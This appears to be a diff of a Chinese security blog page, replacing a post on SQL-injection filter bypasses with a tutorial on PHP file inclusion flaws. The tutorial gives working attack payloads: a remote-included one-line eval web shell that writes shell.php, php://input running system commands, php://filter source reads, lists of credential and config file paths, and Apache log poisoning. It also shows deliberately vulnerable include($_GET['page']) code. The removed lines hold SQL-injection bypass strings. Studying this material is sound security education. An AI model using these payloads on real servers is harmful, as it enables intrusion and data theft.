@@ -43,7 +43,7 @@
     
     <title>
         
-            0x02 SQL注入绕过 | 
+            0x11 文件包含 | 
         
         张Mini
     </title>
@@ -54,7 +54,7 @@
 
     <meta name="format-detection" content="telephone=no"/>
     <meta name="description" itemprop="description" content="">
-    <meta name="keywords" content="张Mini,SQL">
+    <meta name="keywords" content="张Mini,Web">
     <meta name="theme-color" content="#555555">
 
     <!-- Disable Fucking Bloody Baidu Tranformation -->
@@ -220,7 +220,7 @@
     <!-- WebAPP Icons -->
     <meta name="mobile-web-app-capable" content="yes">
     <meta name="application-name" content="张Mini">
-    <meta name="msapplication-starturl" content="http://alittlexyz.com/2018/05/24/2/">
+    <meta name="msapplication-starturl" content="http://alittlexyz.com/2018/05/30/11/">
     <meta name="msapplication-navbutton-color" content="#555555">
     <meta name="apple-mobile-web-app-capable" content="yes">
     <meta name="apple-mobile-web-app-title" content="张Mini">
@@ -235,16 +235,16 @@
     
 
     <!-- The Open Graph protocol -->
-    <meta property="og:url" content="http://alittlexyz.com/2018/05/24/2/">
+    <meta property="og:url" content="http://alittlexyz.com/2018/05/30/11/">
     <meta property="og:type" content="blog">
-    <meta property="og:title" content="0x02 SQL注入绕过 | 张Mini">
+    <meta property="og:title" content="0x11 文件包含 | 张Mini">
     <meta property="og:image" content="/img/favicon.png">
     <meta property="og:description" content="">
-    <meta property="og:article:tag" content="SQL"> 
+    <meta property="og:article:tag" content="Web"> 
 
     
-        <meta property="article:published_time" content="Thu May 24 2018 08:04:55 GMT+0800">
-        <meta property="article:modified_time" content="Fri May 25 2018 20:52:55 GMT+0800">
+        <meta property="article:published_time" content="Wed May 30 2018 09:25:51 GMT+0800">
+        <meta property="article:modified_time" content="Wed May 30 2018 09:54:39 GMT+0800">
     
 
     <!-- The Twitter Card protocol -->
@@ -252,7 +252,7 @@
 
     <!-- Add canonical link for SEO -->
     
-        <link rel="canonical" href="http://alittlexyz.com/2018/05/24/2/index.html" />
+        <link rel="canonical" href="http://alittlexyz.com/2018/05/30/11/index.html" />
     
 
     <!-- Structured-data for SEO -->
@@ -264,10 +264,10 @@
 {
     "@context": "https://schema.org",
     "@type": "BlogPosting",
-    "mainEntityOfPage": "http://alittlexyz.com/2018/05/24/2/index.html",
-    "headline": "0x02 SQL注入绕过",
-    "datePublished": "Thu May 24 2018 08:04:55 GMT+0800",
-    "dateModified": "Fri May 25 2018 20:52:55 GMT+0800",
+    "mainEntityOfPage": "http://alittlexyz.com/2018/05/30/11/index.html",
+    "headline": "0x11 文件包含",
+    "datePublished": "Wed May 30 2018 09:25:51 GMT+0800",
+    "dateModified": "Wed May 30 2018 09:54:39 GMT+0800",
     "author": {
         "@type": "Person",
         "name": "张Mini",
@@ -285,7 +285,7 @@
             "url": "/img/favicon.png"
         }
     },
-    "keywords": ",SQL张Mini",
+    "keywords": ",Web张Mini",
     "description": "",
 }
 </script>
@@ -351,7 +351,7 @@
     </button>
 
     <ul class="post-toc-wrap mdl-menu mdl-menu--bottom-left mdl-js-menu mdl-js-ripple-effect" for="post-toc-trigger-btn" style="max-height:80vh; overflow-y:scroll;">
-        <ol class="post-toc"><li class="post-toc-item post-toc-level-1"><a class="post-toc-link" href="#SQL注入绕过"><span class="post-toc-number">1.</span> <span class="post-toc-text">SQL注入绕过</span></a><ol class="post-toc-child"><li class="post-toc-item post-toc-level-2"><a class="post-toc-link" href="#使用空字节"><span class="post-toc-number">1.1.</span> <span class="post-toc-text">使用空字节</span></a></li><li class="post-toc-item post-toc-level-2"><a class="post-toc-link" href="#大小写变种"><span class="post-toc-number">1.2.</span> <span class="post-toc-text">大小写变种</span></a></li><li class="post-toc-item post-toc-level-2"><a class="post-toc-link" href="#注释绕过"><span class="post-toc-number">1.3.</span> <span class="post-toc-text">注释绕过</span></a></li><li class="post-toc-item post-toc-level-2"><a class="post-toc-link" href="#URL编码绕过"><span class="post-toc-number">1.4.</span> <span class="post-toc-text">URL编码绕过</span></a></li><li class="post-toc-item post-toc-level-2"><a class="post-toc-link" href="#引号绕过"><span class="post-toc-number">1.5.</span> <span class="post-toc-text">引号绕过</span></a></li><li class="post-toc-item post-toc-level-2"><a class="post-toc-link" href="#逗号绕过"><span class="post-toc-number">1.6.</span> <span class="post-toc-text">逗号绕过</span></a></li><li class="post-toc-item post-toc-level-2"><a class="post-toc-link" href="#比较符-lt-gt-绕过"><span class="post-toc-number">1.7.</span> <span class="post-toc-text">比较符(&lt;,&gt;)绕过</span></a></li><li class="post-toc-item post-toc-level-2"><a class="post-toc-link" href="#嵌套剥离后的表达式"><span class="post-toc-number">1.8.</span> <span class="post-toc-text">嵌套剥离后的表达式</span></a></li><li class="post-toc-item post-toc-level-2"><a class="post-toc-link" href="#黑名单绕过"><span class="post-toc-number">1.9.</span> <span class="post-toc-text">黑名单绕过</span></a><ol class="post-toc-child"><li class="post-toc-item post-toc-level-3"><a class="post-toc-link" href="#1-过滤关键字-and-or"><span class="post-toc-number">1.9.1.</span> <span class="post-toc-text">1. 过滤关键字: and,or</span></a></li><li class="post-toc-item post-toc-level-3"><a class="post-toc-link" href="#2-过滤关键字-and-or-union"><span class="post-toc-number">1.9.2.</span> <span class="post-toc-text">2. 过滤关键字: and or union</span></a></li><li class="post-toc-item post-toc-level-3"><a class="post-toc-link" href="#3-过滤关键字-and-or-union-where"><span class="post-toc-number">1.9.3.</span> <span class="post-toc-text">3. 过滤关键字 and or union where</span></a></li><li class="post-toc-item post-toc-level-3"><a class="post-toc-link" href="#4-过滤关键字-and-or-union-where-limit"><span class="post-toc-number">1.9.4.</span> <span class="post-toc-text">4. 过滤关键字: and or union where limit</span></a></li><li class="post-toc-item post-toc-level-3"><a class="post-toc-link" href="#5-过滤关键字-and-or-union-where-limit-group-by"><span class="post-toc-number">1.9.5.</span> <span class="post-toc-text">5. 过滤关键字: and or union where limit group by</span></a></li><li class="post-toc-item post-toc-level-3"><a class="post-toc-link" href="#6-过滤关键字-and-or-union-where-limit-group-by-select"><span class="post-toc-number">1.9.6.</span> <span class="post-toc-text">6. 过滤关键字: and or union where limit group by select</span></a></li><li class="post-toc-item post-toc-level-3"><a class="post-toc-link" href="#7-过滤关键字-and-or-union-where-limit-group-by-select-‘"><span class="post-toc-number">1.9.7.</span> <span class="post-toc-text">7. 过滤关键字: and or union where limit group by select ‘</span></a></li><li class="post-toc-item post-toc-level-3"><a class="post-toc-link" href="#8-过滤关键字-and-or-union-where-limit-group-by-select-‘-hex"><span class="post-toc-number">1.9.8.</span> <span class="post-toc-text">8. 过滤关键字: and or union where limit group by select ‘ hex</span></a></li><li class="post-toc-item post-toc-level-3"><a class="post-toc-link" href="#9-过滤关键字-and-or-union-where-limit-group-by-select-‘-hex-substr"><span class="post-toc-number">1.9.9.</span> <span class="post-toc-text">9. 过滤关键字:and or union where limit group by select ‘ hex substr</span></a></li><li class="post-toc-item post-toc-level-3"><a class="post-toc-link" href="#10-过滤关键字-and-or-union-where-limit-group-by-select-‘-hex-substr-空格"><span class="post-toc-number">1.9.10.</span> <span class="post-toc-text">10. 过滤关键字:  and or union where limit group by select ‘ hex substr 空格</span></a></li></ol></li></ol></li></ol>
+        <ol class="post-toc"><li class="post-toc-item post-toc-level-1"><a class="post-toc-link" href="#文件包含漏洞"><span class="post-toc-number">1.</span> <span class="post-toc-text">文件包含漏洞</span></a><ol class="post-toc-child"><li class="post-toc-item post-toc-level-2"><a class="post-toc-link" href="#PHP包含"><span class="post-toc-number">1.1.</span> <span class="post-toc-text">PHP包含</span></a></li><li class="post-toc-item post-toc-level-2"><a class="post-toc-link" href="#文件包含示例"><span class="post-toc-number">1.2.</span> <span class="post-toc-text">文件包含示例</span></a><ol class="post-toc-child"><li class="post-toc-item post-toc-level-3"><a class="post-toc-link" href="#本地包含"><span class="post-toc-number">1.2.1.</span> <span class="post-toc-text">本地包含</span></a></li><li class="post-toc-item post-toc-level-3"><a class="post-toc-link" href="#远程包含"><span class="post-toc-number">1.2.2.</span> <span class="post-toc-text">远程包含</span></a></li></ol></li><li class="post-toc-item post-toc-level-2"><a class="post-toc-link" href="#PHP文件包含利用"><span class="post-toc-number">1.3.</span> <span class="post-toc-text">PHP文件包含利用</span></a><ol class="post-toc-child"><li class="post-toc-item post-toc-level-3"><a class="post-toc-link" href="#读取敏感文件"><span class="post-toc-number">1.3.1.</span> <span class="post-toc-text">读取敏感文件</span></a></li><li class="post-toc-item post-toc-level-3"><a class="post-toc-link" href="#远程包含Shell"><span class="post-toc-number">1.3.2.</span> <span class="post-toc-text">远程包含Shell</span></a></li><li class="post-toc-item post-toc-level-3"><a class="post-toc-link" href="#本地包含配合文件上传"><span class="post-toc-number">1.3.3.</span> <span class="post-toc-text">本地包含配合文件上传</span></a></li><li class="post-toc-item post-toc-level-3"><a class="post-toc-link" href="#使用PHP封装协议"><span class="post-toc-number">1.3.4.</span> <span class="post-toc-text">使用PHP封装协议</span></a></li><li class="post-toc-item post-toc-level-3"><a class="post-toc-link" href="#包含Apahce日志文件"><span class="post-toc-number">1.3.5.</span> <span class="post-toc-text">包含Apahce日志文件</span></a></li><li class="post-toc-item post-toc-level-3"><a class="post-toc-link" href="#截断包含"><span class="post-toc-number">1.3.6.</span> <span class="post-toc-text">截断包含</span></a></li></ol></li></ol></li></ol>
     </ul>
     
 
@@ -383,7 +383,7 @@
         
     
             <p class="article-headline-p">
-                0x02 SQL注入绕过
+                0x11 文件包含
             </p>
         </div>
 
@@ -402,7 +402,7 @@
     <!-- Author Name & Date -->
     <div>
         <strong>张Mini</strong>
-        <span>May 24, 2018</span>
+        <span>May 30, 2018</span>
     </div>
 
     <div class="section-spacer"></div>
@@ -424,7 +424,7 @@
 <ul class="mdl-menu mdl-menu--bottom-right mdl-js-menu mdl-js-ripple-effect" for="article-functions-qrcode-button">
     <li class="mdl-menu__item">Read this article on other devices</li>
     
-        <img src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAN4AAADeCAAAAAB3DOFrAAACZUlEQVR42u3aQZICIQwFUO9/6ZkDWLY/CWBrvV5ZNUrzWEDmk8ffTz8PPDw8PDw8PDy8m/Ee8fP8/edx3rz4xW9fjVCdGx4eHt5JXjKtZIqT70+WDA8PD+9TvOvDIJ/Q9dZ/Pf7152hueHh4eDfjFUrbAH99hODh4eH9Bi/f7q83+rwcx8PDw7szr/APfxGcRBLz5cDDw8M7yategJ38/IH7PTw8PLxLXvXpRb1J2Z0fHm9miIeHh7eZlwSpvRcnxXGyQNWmBDw8PLzdvGrEMNn6k0XsvREPDw/vJC9/TXWj7y3QZOHw8PDwTvKSzbpa/uZLlo+Mh4eHdwdeNbTNj4cc1gtEFlyA4eHh4W3g9ULVaqyQl+/R4uLh4eFt5lWL2uS3vRi3upSF1gE8PDy8DbxesTuJFdbGwXh4eHif4vU28WohnlxxTdq/8PDw8M7w5m2pk1hhHu/i4eHhneftiFaTX+Whw+IwAg8PD2/AS7b4SUPApFxOjqtC6wAeHh7eIt6qtqfeZVh+YCR/xcPDw7sDLw8mJht6byEWHAx4eHh4LV4+3Wq7wKoYorp8eHh4eGd4hZC0FfvmLQWTABcPDw/vDC/Zvqvxbn6QVCPgqGUBDw8PbzOv+uRhbt6CkGz9hW/i4eHhbeZNrvmTFyej5eMkRTkeHh7eGd480p00GeRNA9F88PDw8A7yku17chisCiPw8PDwvos3aa7qjZAEx3h4eHjfyKsGr3kpn78RDw8P7zyv1yAVXecXy/RCaLs2a8HDw8OLecuCgGBy1di3utx4eHh4u3m/9+Dh4eHh4eHh4d3g+Qcp3Aw3uxpY8AAAAABJRU5ErkJggg==">
+        <img src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAN4AAADeCAAAAAB3DOFrAAACX0lEQVR42u3aQW7DMAwEwPz/0+0DAqhLUWINY3wyktjW+CApS35+Xn188PDw8PDw8PDwHsb7xMf3Vd/n62+T8wNjw8PDwxvh/THVLoe1fmT1BSXs9fjx8PDwJnnrIebUNX79rM7Y8PDw8J7MS7a2nWUGDw8P7028/kvphBp4eHh4T+Plf/hfm7Xg4eHhxby8yDR/Plrfw8PDwwt45ZamYOrPg4m931/sKcPDw8MLeJ3WgSQmOFXoKpTN8PDw8C7zckb+gH4MUY088PDw8CZ51QCis1HOC1rVUhkeHh7eJC95WL7ZjR6/1aTVinHx8PDwjvI6zVJJWNCJKqovAg8PD2+Sl980j3TziKE6kvLCgIeHh3eUl2ydk2l9b0DrrfmxlBoPDw/vKC9ZAM4OvRrvVoMPPDw8vEleJw44Gzrsxcd4eHh487xO+araXFVdAAoRBh4eHt4Ir1rQ2tuUnw12y60DeHh4eId4eYkrn9yrDQR7sXLUOoCHh4d3gbcXquYFsGQZSO5QiEXw8PDwRnjJxJ2EFP2lZf3LaCR4eHh4I7y8CaBT+O+0Z+WLBB4eHt48L5l89448wN1bePDw8PAmeXu3vhEr5MFH+R8DHh4e3iFeZ3JPNr55i0ByVbTtxsPDw7vMq5a4kkhi75M8BDmQUuPh4eG1edUQIY8q8mv3FgY8PDy8/+WdbSrNN9PXsxY8PDy8x/D2AHuMwuYeDw8P7/G85NtOQ2oZjIeHhzfIqwKS5tRqeayzZcfDw8Ob5OUb3LzpP3kFeexbiIPx8PDwLvPed+Dh4eHh4eHh4T3g+AV9O+hMk8NccgAAAABJRU5ErkJggg==">
     
 </ul>
 
@@ -438,7 +438,7 @@
     </button>
     <ul class="mdl-menu mdl-menu--bottom-right mdl-js-menu mdl-js-ripple-effect" for="article-functions-viewtags-button">
         <li class="mdl-menu__item">
-        <a class="post_tag-link" href="/tags/SQL/">SQL</a>
+        <a class="post_tag-link" href="/tags/Web/">Web</a>
     </ul>
     
 
@@ -455,7 +455,7 @@
 
     <!-- Share Weibo -->
     
-        <a class="post_share-link" href="http://service.weibo.com/share/share.php?appkey=&title=0x02 SQL注入绕过&url=http://alittlexyz.com/2018/05/24/2/index.html&pic=http://alittlexyz.com/img/favicon.png&searchPic=false&style=simple" target="_blank">
+        <a class="post_share-link" href="http://service.weibo.com/share/share.php?appkey=&title=0x11 文件包含&url=http://alittlexyz.com/2018/05/30/11/index.html&pic=http://alittlexyz.com/img/favicon.png&searchPic=false&style=simple" target="_blank">
             <li class="mdl-menu__item">
                 Share to Weibo
             </li>
@@ -476,7 +476,7 @@
 
     <!-- Share QQ -->
     
-        <a class="post_share-link" href="http://connect.qq.com/widget/shareqq/index.html?site=张Mini&title=0x02 SQL注入绕过&summary=&pics=http://alittlexyz.com/img/favicon.png&url=http://alittlexyz.com/2018/05/24/2/index.html" target="_blank">
+        <a class="post_share-link" href="http://connect.qq.com/widget/shareqq/index.html?site=张Mini&title=0x11 文件包含&summary=&pics=http://alittlexyz.com/img/favicon.png&url=http://alittlexyz.com/2018/05/30/11/index.html" target="_blank">
             <li class="mdl-menu__item">
                 Share to QQ
             </li>
@@ -495,134 +495,177 @@
                 <!-- Post Content -->
                 <div id="post-content" class="mdl-color-text--grey-700 mdl-card__supporting-text fade out">
     
-        <h1 id="SQL注入绕过"><a href="#SQL注入绕过" class="headerlink" title="SQL注入绕过"></a>SQL注入绕过</h1><hr>
-<h2 id="使用空字节"><a href="#使用空字节" class="headerlink" title="使用空字节"></a>使用空字节</h2><p>要想执行空字节攻击，只需在过滤器阻止的字符前面提供一个采用URL编码的空字节即可</p>
-<pre><code class="sql">%00&#39; union select password from tblUsers where username=&#39;admin&#39; --+
+        <h1 id="文件包含漏洞"><a href="#文件包含漏洞" class="headerlink" title="文件包含漏洞"></a>文件包含漏洞</h1><hr>
+<p>程序开发人员通常会把可重复使用的函数写到单个文件中，在使用其它函数时，直接调用此文件，而无需再次编写，这种调用文件的过程一般称为包含</p>
+<p>程序开发人员都希望代码更加灵活，所以通常会将被包含的文件设置为变量，用来进行动态调用。正是这种灵活性，从而导致客户端可以调用一个恶意文件，造成文件包含漏洞</p>
+<h2 id="PHP包含"><a href="#PHP包含" class="headerlink" title="PHP包含"></a>PHP包含</h2><p>php中提供四个文件包含的函数，分别是include(),include_once(),require()和require_once()。这四个都可以进行文件包含，但有区别</p>
+<ol>
+<li>require：找不到被包含的文件时会产生致命错误(E_COMPILE_ERROR)，并停止脚本</li>
+<li>include：找不到被包含的文件时只会产生警告(E_WARNING)，脚本继续执行</li>
+<li>include_once：此语句和include类似，唯一区别就是如果该文件中的代码已经被包含，则不会再次包含</li>
+<li>require_once：此语句和require类似，唯一区别就是如果该文件中的代码已经被包含。则不会再次包含</li>
+</ol>
+<h2 id="文件包含示例"><a href="#文件包含示例" class="headerlink" title="文件包含示例"></a>文件包含示例</h2><p>PHP中的文件包含分为本地包含和远程包含</p>
+<p>服务器环境为:</p>
+<p>PHP 5.2.14</p>
+<p>Mysql 5.1</p>
+<p>Apache 2.0.63 (Win32)</p>
+<h3 id="本地包含"><a href="#本地包含" class="headerlink" title="本地包含"></a>本地包含</h3><p>ArrayUtil.php 文件提供了字符串操作函数</p>
+<pre><code class="php">&lt;?php
+    function PrintArr($arr,$sp=&quot;--&gt;&quot;,$lin=&quot;&lt;br/&gt;&quot;) {
+        foreach($arr as $key =&gt; $value) {
+            echo &quot;$key $sp $value $lin&quot; ;
+        }
+    }
+    ...
+    ...
+?&gt;
 </code></pre>
-<h2 id="大小写变种"><a href="#大小写变种" class="headerlink" title="大小写变种"></a>大小写变种</h2><p>如果某些关键字过滤器不够聪明，可以使用变换攻击字符串中字符的大小来避开</p>
-<pre><code class="sql">&#39;uNiOn SeLeCt password frOm tblUsers WhErE usermane=&quot;admin&quot; --+
+<p>Index.php对ArrayUtil.php进行包含，并且使用PrintArr函数</p>
+<pre><code class="php">&lt;?php
+    include(&quot;ArrayUtil.php&quot;)            //包含ArrayUtil.php
+    $arr=array(&quot;张三&quot;,&quot;李四&quot;,&quot;王五&quot;);
+    PrintArr($arr,&quot;==&gt;&quot;);               //使用ArrayUtil.php中的PrintArr函数
+?&gt;
 </code></pre>
-<h2 id="注释绕过"><a href="#注释绕过" class="headerlink" title="注释绕过"></a>注释绕过</h2><p>使用内联注释序列创建SQL代码段</p>
-<pre><code class="sql">&#39;/**/union/**/select/**/password/**/from/**/tblusers/**/where/**/username/**/like/**/&#39;admin&#39; --+ 
+<p>Index.php文件执行结果正常</p>
+<pre><code class="php">0 ==&gt; 张三
+1 ==&gt; 李四
+2 ==&gt; 王五
 </code></pre>
-<h2 id="URL编码绕过"><a href="#URL编码绕过" class="headerlink" title="URL编码绕过"></a>URL编码绕过</h2><p>2007年PHP-Nuke发现有一个漏洞所使用的过滤器能阻止空白符和内敛注释/* ，但无法阻止以注释序列所表示的URL编码</p>
-<pre><code class="sql">&#39;%2f%2a*/union%2f%2a*/select%2f%2a*/password%2f%2a*/from%2f%2a*/tblusers%2f%2a*/where%2f%2a*/username%2f%2a*/like%2f%2a*/&#39;admin&#39;--+ 
+<p>下面再看一个例子，phpinfo.txt是一个正常的文本文件，单文件内容却是符合php语法的代码</p>
+<pre><code class="php">&lt;?php
+    phpinfo();
+?&gt;
 </code></pre>
-<p>这种基本的URL编码攻击对其他情况不起作用，不过仍可以通过对被阻止的字符进行双URL编码来避开过滤器</p>
-<pre><code class="sql">&#39;%252f%252a*/union%252f%252a*/select%252f%252a*/password%252f%252a*/from%252f%252a*/tblusers%252f%252a*/where%252f%252a*/username%252f%252a*/like%252f%252a*/&#39;admin&#39;--+ 
+<p>在Index.php文件中包含phpinfo.txt，代码如下:</p>
+<pre><code class="php">&lt;?php
+    include(&quot;phpinfo.txt&quot;);     //包含txt文件
+?&gt;
 </code></pre>
-<p>双url编码有时会起作用</p>
-<h2 id="引号绕过"><a href="#引号绕过" class="headerlink" title="引号绕过"></a>引号绕过</h2><pre><code class="sql">select table_name from information_schema.tables where table_schema=&quot;example&quot;
+<p>在浏览器访问Index.php却显示phpinfo内容，之后改变文件扩展名为:jpg,rar,xxx,doc等进行测试发现都可以显示phpindo信息。由此，只要文件符合PHP语法规范，那么任何扩展名都可以被PHP解析</p>
+<h3 id="远程包含"><a href="#远程包含" class="headerlink" title="远程包含"></a>远程包含</h3><p>需要确定PHP是否开启远程包含选项 在php.ini文件中修改</p>
+<p>allow_url_include=Off              //把Off改为On</p>
+<p><a href="http://www.2cto.com/根目录下存在php.txt" target="_blank" rel="noopener">http://www.2cto.com/根目录下存在php.txt</a></p>
+<pre><code class="php">&lt;?php
+    echo &quot;Hello World&quot;;
+?&gt;
 </code></pre>
-<p>如果引号被过滤是没办法进行过滤的，这时候可以转换为十六进制</p>
-<h2 id="逗号绕过"><a href="#逗号绕过" class="headerlink" title="逗号绕过"></a>逗号绕过</h2><p>在使用盲注的时候，需要使用到 substr() ,mid(),limit。这些子句方法都需要使用到逗号。对于 substr() 和mid()这两个方法可以使用from to的方式来解决</p>
-<pre><code class="sql">select substr(database(0 from 1 to 1);
-select mid(database(0 from 1 to 1);
+<p>Index.php代码</p>
+<pre><code class="php">&lt;?php
+    include($_GET[&#39;page&#39;]);
+?&gt;
 </code></pre>
-<p>对于limit可以使用offset绕过</p>
-<pre><code class="sql">select * from news limit 0,1
-# 等价于下面这条SQL语句
-select * from news limit 1 offset 0
+<p>访问:</p>
+<p><a href="http://www.xxser.com/Index.php?page=http://www.2cto.com/php.txt" target="_blank" rel="noopener">http://www.xxser.com/Index.php?page=http://www.2cto.com/php.txt</a></p>
+<p>文件包含漏洞</p>
+<pre><code class="php">&lt;?php
+    if(isset($_GET[&#39;page&#39;])) {
+        include $_GET[&#39;page&#39;];
+    } else {
+        include &#39;home.php&#39;;
+    }    
+?&gt;
 </code></pre>
-<h2 id="比较符-lt-gt-绕过"><a href="#比较符-lt-gt-绕过" class="headerlink" title="比较符(&lt;,&gt;)绕过"></a>比较符(&lt;,&gt;)绕过</h2><p>如果无法使用比较操作符，那么就需要使用greatest来进行过滤</p>
-<pre><code class="sql">select * from users where id=1 and ascii(substr(database(),0,1))&gt;64
+<p>PHP前台代码如下:</p>
+<pre><code class="html">&lt;a href=&quot;Index.php?page=main.php&quot;&gt;主页&lt;/a&gt;
+&lt;a href=&quot;Index.php?page=news.php&quot;&gt;新闻&lt;/a&gt;
+&lt;a href=&quot;Index.php?page=down.php&quot;&gt;下载&lt;/a&gt;
 </code></pre>
-<p>此时如果比较操作符被过滤，上面的盲注语句则无法使用,那么就可以使用greatest来代替比较操作符了。greatest(n1,n2,n3,等)函数返回输入参数(n1,n2,n3,等)的最大值。</p>
-<pre><code class="sql">select * from users where id=1 and greatest(ascii(substr(database(),0,1)),64)=64
+<p>攻击者不会乖乖的按照程序指定好的规则去访问，如:<a href="http://www.xxser.com/index.php?page=xxx.php" target="_blank" rel="noopener">http://www.xxser.com/index.php?page=xxx.php</a></p>
+<p>访问上述URL会包含xxx.php，但xxx.php在服务器端不存在，所以会出现以下警告，暴露网站的绝对路径</p>
+<p>Warning: include(xxx.php) [function.include]: failed to open stream: No such files or directory in F:\php\index.php on line 4</p>
+<p>…</p>
+<h2 id="PHP文件包含利用"><a href="#PHP文件包含利用" class="headerlink" title="PHP文件包含利用"></a>PHP文件包含利用</h2><h3 id="读取敏感文件"><a href="#读取敏感文件" class="headerlink" title="读取敏感文件"></a>读取敏感文件</h3><p>访问:</p>
+<p> <a href="http://www.xxser.com/index.php?page=/etc/password" target="_blank" rel="noopener">http://www.xxser.com/index.php?page=/etc/password</a></p>
+<p> 如果目标主机文件存在，并切有相应的权限，就可以读出文件的内容。反之，会得到一个类似与: open_basedirrestriction in effect的警告</p>
+<p> 常见敏感信息如下:</p>
+<p>win:</p>
+<pre><code>C:\boot.ini                                       //查看系统版本
+C:\windows\system32\instsrv\MetaBase.xml          //IIS配置文件
+C:\windows\repair\sam                             //存储Windows系统初次安装的密码
+C:\Program Files\mysql\my.ini                     //mysql配置
+C:\Program Files\mysql\data\mysql\user.MYD        //Mysql root
+C:\Windows\php.ini                                //php配置信息
+C:\Windows\my.ini                                 //Mysql配置信息
+</code></pre><p>UNIX/Linux</p>
+<pre><code>/etc/passwd                                       
+/usr/local/app/apache2/conf/extra/httped-vhosts.conf //虚拟网络设置
+/usr/local/app/apache2/conf/httpd.conf               //apache2默认配置文件
+/usr/local/app/php5/lib/php.ini                      //php相关设置
+/etc/httpd/conf/httpd.conf                           //apache配置文件
+/etc/my.conf                                         //Mysql配置文件
+</code></pre><h3 id="远程包含Shell"><a href="#远程包含Shell" class="headerlink" title="远程包含Shell"></a>远程包含Shell</h3><p>如果目标主机的allow_url_fopen是激活的，就可以尝试远程包含一句话木马，如: <a href="http://www.2cto.com/echo.txt" target="_blank" rel="noopener">http://www.2cto.com/echo.txt</a></p>
+<p>代码如下:</p>
+<pre><code class="php">&lt;?fputs(fopen(&quot;shell.php&quot;,&quot;w&quot;),&quot;&lt;?php eval ($_POST[xxser]);?&gt;&quot;)?&gt;
 </code></pre>
-<h2 id="嵌套剥离后的表达式"><a href="#嵌套剥离后的表达式" class="headerlink" title="嵌套剥离后的表达式"></a>嵌套剥离后的表达式</h2><p>有些审查过滤器会先从用户输入中剥离特定的字符或表达式，然后在按照常用的方式处理剩下的数据。如果被剥离的表达式中包含两个或以上的字符，就不会递归应用过滤器。通常可以通过在禁止的表达式中嵌套自身来绕过过滤器</p>
-<pre><code class="sql">selectselect
+<p>访问:</p>
+<p> <a href="http://www.xxser.com/Index.php?page=http://www.2cto.com/echo.txt" target="_blank" rel="noopener">http://www.xxser.com/Index.php?page=http://www.2cto.com/echo.txt</a></p>
+<p> 将会在Index.php所在的目录下生成shell.php</p>
+<h3 id="本地包含配合文件上传"><a href="#本地包含配合文件上传" class="headerlink" title="本地包含配合文件上传"></a>本地包含配合文件上传</h3><p> 很多网站通常会提供文件上传的功能，比如:上传头像、文档等。假设已经上传一句话图片木马到服务器，路径为:</p>
+<p>/uploadfile/201363.jpg</p>
+<p>图片代码如下:</p>
+<pre><code class="php">&lt;?fputs(fopen(&quot;shell.php&quot;,&quot;w&quot;),&quot;&lt;?php eval($_POST[xxser]);?&gt;&quot;)?&gt;
 </code></pre>
-<h2 id="黑名单绕过"><a href="#黑名单绕过" class="headerlink" title="黑名单绕过"></a>黑名单绕过</h2><h3 id="1-过滤关键字-and-or"><a href="#1-过滤关键字-and-or" class="headerlink" title="1. 过滤关键字: and,or"></a>1. 过滤关键字: and,or</h3><p>php代码</p>
-<pre><code class="php">preg_match(&#39;/(and|or)/i&#39;,$id)
+<p>访问URL: </p>
+<p><a href="http://www.xxser.com/Index.php?page=./iploadfile/201363.jpg" target="_blank" rel="noopener">http://www.xxser.com/Index.php?page=./iploadfile/201363.jpg</a></p>
+<p>包含这张图片，将会在Index.php所在的目录中生成shell.php</p>
+<h3 id="使用PHP封装协议"><a href="#使用PHP封装协议" class="headerlink" title="使用PHP封装协议"></a>使用PHP封装协议</h3><p>PHP带有很多内置的URL风格的封装协议，，这类协议与fopen(),copy(),file_exists(),filesize()等文件系统函数所提供的功能类似</p>
+<pre><code>file://              访问本地文件系统
+http://              访问HTTP(s)网址
+php://               访问输入/输出流
+zlib://              压缩流
+data://              数据
+ssh2://              Secure Shell 2
+expect://            处理交互式的流
+glob://              查找匹配的文件路径
+</code></pre><p>使用PHP封装协议内置封装协议可以读取PHP文件</p>
+<p><a href="http://www.xxser.com/index.php?page=php://filter/read=convert.base64-encode/resource=config.php5/lib/php" target="_blank" rel="noopener">http://www.xxser.com/index.php?page=php://filter/read=convert.base64-encode/resource=config.php5/lib/php</a></p>
+<p>得到base64加密的php源码</p>
+<p>写入php文件</p>
+<p>使用php://input执行php语句，但使用这条语句时需要注意: php://input受限于allow_url_include</p>
+<p>构造URL: </p>
+<p><a href="http://www.xxser.com/index.php?page=php://input" target="_blank" rel="noopener">http://www.xxser.com/index.php?page=php://input</a></p>
+<p>并且提交数据为: </p>
+<pre><code class="php">&lt;?php system (&#39;net user&#39;);?&gt;
 </code></pre>
-<p>会过滤的代码</p>
-<pre><code class="sql">1 or 1=1 1 and 1=1
+<p>如果提交</p>
+<pre><code class="php">&lt;?fputs(fopen(&quot;shell.php&quot;,&quot;w&quot;),&quot;&lt;?php eval($_POST[&#39;xxser&#39;]);?&gt;&quot;)?&gt;
 </code></pre>
-<p>绕过方式</p>
-<pre><code class="sql">1 || 1=1 1 &amp;&amp; 1=1
+<p>将会在index.php所在目录下生成shell.php</p>
+<h3 id="包含Apahce日志文件"><a href="#包含Apahce日志文件" class="headerlink" title="包含Apahce日志文件"></a>包含Apahce日志文件</h3><p>Apache运行后一般默认生成两个日志文件，一个是access.log和error.log，Apache访问日志文件记录了客户端的每次请求及服务器响应的相关信息，例如，当我们请求Index.php时，Apache就会记录我们的操作，并且写到访问日志文件access.log中</p>
+<p>当访问一个不存在的资源时，Apache日志同样会记录</p>
+<p>这就意味着，如果网站存在本地包含漏洞，却没有可以包含的文件时，就可以去访问URL: </p>
+<pre><code>http://www.xxser.com/&lt;?php phpinfo();?&gt;
+</code></pre><p>Apache会记录请求</p>
+<pre><code>&lt;?php phpinfo();?&gt;
+</code></pre><p>并写到accsee.log文件中，这时再去包含Apache的日志文件，就可以利用包含漏洞</p>
+<p>但实际是不可行的，因为在访问URL后一句话木马在日志文件里变形了</p>
+<pre><code>127.0.0.1 - - [04/Jun/2013:15:04:22 +0800] &quot;GET /%3C?php%20phpinfo();)?%3E HTTP/1.1&quot; 403 291
+</code></pre><p>PHP代码中的”&lt;,&gt;,空格”都被浏览器转码了，这样就无法利用Apache包含漏洞</p>
+<p>但可以通过Burp绕过编码</p>
+<p>再利用accsee去包含accsee.log，即可成功执行其中的PHP代码</p>
+<p>在使用Apache日志文件包含时，首先需要确定Apache的日志路径，否则即使攻击者将PHP写入日志文件，也无法包含</p>
+<h3 id="截断包含"><a href="#截断包含" class="headerlink" title="截断包含"></a>截断包含</h3><p>很多程序员认为PHP中的包含漏洞比较好修复，固定扩展名即可</p>
